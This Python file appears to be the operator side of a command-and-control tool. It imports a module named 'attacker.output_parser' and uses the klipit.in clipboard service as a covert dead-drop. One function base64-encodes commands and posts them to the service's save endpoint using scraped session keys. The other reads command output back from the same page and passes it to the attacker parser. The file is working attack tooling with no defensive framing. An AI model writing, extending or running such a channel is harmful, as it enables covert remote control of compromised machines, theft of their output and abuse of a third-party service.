import requests
import re
import base64
import datetime
from bs4 import BeautifulSoup
import attacker.output_parser


PRIVATEBIN_URL = "<KLIPIT.IN/CODE>" # eg: klipit.in/ewq81437

def fetch_clipboard_data(url=PRIVATEBIN_URL):

    response = requests.get(url)
    
    if response.status_code == 200:

        soup = BeautifulSoup(response.text, "html.parser")
        data = soup.find("textarea", {"id": "data"}).text
        filename = "command_outputs.txt"
        with open(filename, "w") as file:
            file.write(data)

        attacker.output_parser.parse(filename)
        return True

    else:
        return False



def push_to_klipit(command: str):

    session = requests.Session()
    url = PRIVATEBIN_URL

    encoded_command = base64.b64encode(command.encode()).decode()
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data = f'[{timestamp}]Command:"{encoded_command}"'
    

    response = session.get(url)
    if response.status_code != 200:
        return False


    cid_match = re.search(r'cid\s*[:=]\s*["\'](\d+)["\']', response.text)
    key_match = re.search(r'key\s*[:=]\s*["\']([a-f0-9]+)["\']', response.text)

    if not cid_match or not key_match:
        return False


    cid = cid_match.group(1)
    key = key_match.group(1)

    # POST request to update clipboard content
    post_url = 'https://klipit.in/ajax_save_data.php'
    payload = {
        'i': cid,
        'k': key,
        'd': data
    }
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': url
    }

    post_response = session.post(post_url, data=payload, headers=headers)
    if post_response.status_code == 200:
        return True
    else:
        return False
